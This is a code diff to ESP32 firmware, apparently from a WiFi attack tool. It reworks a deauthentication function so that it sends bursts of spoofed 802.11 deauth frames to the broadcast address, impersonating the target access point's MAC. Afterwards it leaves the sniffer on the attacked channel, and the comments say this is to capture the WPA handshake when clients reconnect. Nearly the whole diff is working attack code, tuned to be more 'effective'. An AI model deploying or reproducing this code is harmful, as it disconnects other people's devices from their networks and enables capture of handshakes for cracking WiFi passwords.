@@ -298,14 +298,28 @@ uint8_t wifi_get_channel(void) { return g_current_channel; }
 
 esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac,
                            uint8_t channel, uint16_t reason) {
+  // Alias for single-packet call - just forward to burst with count=1
+  return wifi_send_deauth_burst(target_mac, ap_mac, channel, reason, 1);
+}
+
+/**
+ * Send a burst of deauthentication frames. This is optimized to only
+ * restart WiFi once (not per-packet), making it much more effective.
+ */
+esp_err_t wifi_send_deauth_burst(const uint8_t *target_mac,
+                                 const uint8_t *ap_mac, uint8_t channel,
+                                 uint16_t reason, int count) {
   if (!ap_mac) {
     ESP_LOGE(TAG, "AP MAC required for deauth");
     return ESP_ERR_INVALID_ARG;
   }
+  if (channel == 0) {
+    channel = g_current_channel > 0 ? g_current_channel : 6;
+  }
 
-  ESP_LOGI(TAG, "Preparing deauth TX to %02X:%02X:%02X:%02X:%02X:%02X on ch %d",
-           ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
-           channel);
+  ESP_LOGI(TAG, "Deauth burst %d packets to %02X:%02X:%02X:%02X:%02X:%02X ch%d",
+           count, ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4],
+           ap_mac[5], channel);
 
   // Save original state
   bool was_promisc = g_promiscuous_active;
@@ -313,7 +327,7 @@ esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac,
   uint8_t original_mac[6];
   esp_wifi_get_mac(WIFI_IF_AP, original_mac);
 
-  // ====== PHASE 1: Tear down current WiFi state ======
+  // ====== PHASE 1: Tear down WiFi ONCE ======
   if (was_hopping) {
     g_channel_hopping = false;
     vTaskDelay(pdMS_TO_TICKS(50));
@@ -324,48 +338,35 @@ esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac,
   }
   esp_wifi_stop();
 
-  // ====== PHASE 2: Reconfigure with spoofed MAC ======
-  // Set AP MAC to target BSSID BEFORE starting WiFi (this is the key)
-  esp_err_t mac_ret = esp_wifi_set_mac(WIFI_IF_AP, ap_mac);
-  if (mac_ret != ESP_OK) {
-    ESP_LOGW(TAG, "MAC spoof returned %d (may still work)", mac_ret);
-  }
+  // ====== PHASE 2: Setup for TX (spoofed MAC, target channel) ======
+  esp_wifi_set_mac(WIFI_IF_AP, ap_mac);
 
-  // Configure minimal AP
   wifi_config_t ap_config = {.ap = {
                                  .ssid = "",
                                  .ssid_len = 0,
                                  .password = "",
-                                 .channel = (channel > 0 && channel <= 13)
-                                                ? channel
-                                                : g_current_channel,
+                                 .channel = channel,
                                  .authmode = WIFI_AUTH_OPEN,
                                  .ssid_hidden = 1,
                                  .max_connection = 0,
                                  .beacon_interval = 60000,
                              }};
 
-  // CRITICAL: Use APSTA mode and enable promiscuous - some drivers allow deauth
-  // in this config
-  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
-  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-  ESP_ERROR_CHECK(esp_wifi_start());
-  ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE)); // Disable power saving
-  ESP_ERROR_CHECK(
-      esp_wifi_set_channel(ap_config.ap.channel, WIFI_SECOND_CHAN_NONE));
-
-  // Enable promiscuous mode - this may unlock raw TX for certain frame types
+  esp_wifi_set_mode(WIFI_MODE_APSTA);
+  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  esp_wifi_start();
+  esp_wifi_set_ps(WIFI_PS_NONE);
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   esp_wifi_set_promiscuous(true);
 
-  // Brief delay for radio to stabilize
-  vTaskDelay(pdMS_TO_TICKS(20));
+  vTaskDelay(pdMS_TO_TICKS(20)); // Let radio stabilize
 
-  // ====== PHASE 3: Build and send deauth frame ======
+  // ====== PHASE 3: Build and send BURST of deauth frames ======
   uint8_t deauth_frame[26] = {
       0xC0, 0x00,                         // Frame Control (Deauth)
       0x00, 0x00,                         // Duration
-      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1 (RA) - Broadcast or Target
-      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2 (TA) - Spoofed AP MAC
+      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1 (RA) - Broadcast
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2 (TA) - Spoofed AP
       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3 (BSSID)
       0x00, 0x00,                         // Sequence number
       0x07, 0x00                          // Reason code
@@ -376,60 +377,65 @@ esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac,
   }
   memcpy(deauth_frame + 10, ap_mac, 6);
   memcpy(deauth_frame + 16, ap_mac, 6);
-
   deauth_frame[24] = reason & 0xFF;
   deauth_frame[25] = (reason >> 8) & 0xFF;
 
-  deauth_frame[22] = (g_deauth_seq & 0x0f) << 4;
-  deauth_frame[23] = (g_deauth_seq & 0xff0) >> 4;
-  g_deauth_seq = (g_deauth_seq + 1) & 0xfff;
+  int ok = 0, fail = 0;
+  for (int i = 0; i < count; i++) {
+    // Update sequence number
+    deauth_frame[22] = (g_deauth_seq & 0x0f) << 4;
+    deauth_frame[23] = (g_deauth_seq & 0xff0) >> 4;
+    g_deauth_seq = (g_deauth_seq + 1) & 0xfff;
 
-  // TX the frame - try with en_sys_seq=true (driver manages sequence)
-  esp_err_t ret =
-      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
+    esp_err_t ret =
+        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
+    if (ret == ESP_OK)
+      ok++;
+    else
+      fail++;
 
-  if (ret == ESP_OK) {
-    ESP_LOGI(TAG, "Deauth TX SUCCESS (seq=%d)", g_deauth_seq - 1);
-  } else {
-    ESP_LOGE(TAG, "Deauth TX FAILED: %d", ret);
+    vTaskDelay(pdMS_TO_TICKS(5)); // 5ms between packets
   }
 
-  // ====== PHASE 4: Restore original state ======
+  ESP_LOGI(TAG, "Deauth TX complete: %d OK, %d FAIL", ok, fail);
+
+  // ====== PHASE 4: Restore promiscuous mode ON TARGET CHANNEL ======
+  esp_wifi_set_promiscuous(false);
   esp_wifi_stop();
   esp_wifi_set_mac(WIFI_IF_AP, original_mac);
 
-  if (was_promisc) {
-    // Restart sniffer with original settings
-    wifi_config_t restore_config = {.ap = {
-                                        .ssid = "chimera_cap",
-                                        .ssid_len = 11,
-                                        .password = "chimerapass",
-                                        .channel = g_current_channel,
-                                        .authmode = WIFI_AUTH_WPA2_PSK,
-                                        .ssid_hidden = 1,
-                                        .max_connection = 0,
-                                        .beacon_interval = 60000,
-                                    }};
-    esp_wifi_set_config(WIFI_IF_AP, &restore_config);
-    esp_wifi_start();
-    esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE);
+  // CRITICAL: Restore sniffer on the SAME channel we just attacked
+  // This ensures we capture the handshake when client reconnects
+  g_current_channel = channel; // Update current channel to target
 
-    wifi_promiscuous_filter_t filter = {.filter_mask =
-                                            WIFI_PROMIS_FILTER_MASK_MGMT |
-                                            WIFI_PROMIS_FILTER_MASK_DATA};
-    esp_wifi_set_promiscuous_filter(&filter);
-    esp_wifi_set_promiscuous_rx_cb(promisc_rx_cb);
-    esp_wifi_set_promiscuous(true);
-    g_promiscuous_active = true;
+  wifi_config_t restore_config = {
+      .ap = {
+          .ssid = "chimera_cap",
+          .ssid_len = 11,
+          .password = "chimerapass",
+          .channel = channel, // TARGET channel, not old channel!
+          .authmode = WIFI_AUTH_WPA2_PSK,
+          .ssid_hidden = 1,
+          .max_connection = 0,
+          .beacon_interval = 60000,
+      }};
 
-    if (was_hopping) {
-      g_channel_hopping = true;
-      xTaskCreate(channel_hopper_task, "ch_hopper", 2048, NULL, 5,
-                  &g_hopper_task);
-    }
-  }
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_set_config(WIFI_IF_AP, &restore_config);
+  esp_wifi_start();
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-  return ret;
+  wifi_promiscuous_filter_t filter = {.filter_mask =
+                                          WIFI_PROMIS_FILTER_MASK_MGMT |
+                                          WIFI_PROMIS_FILTER_MASK_DATA};
+  esp_wifi_set_promiscuous_filter(&filter);
+  esp_wifi_set_promiscuous_rx_cb(promisc_rx_cb);
+  esp_wifi_set_promiscuous(true);
+  g_promiscuous_active = true;
+
+  // Don't restart hopper - stay on target channel to catch handshake!
+
+  return (ok > 0) ? ESP_OK : ESP_FAIL;
 }
 
 void wifi_set_sniffer_callback(wifi_sniffer_cb_t cb) { g_sniffer_cb = cb; }
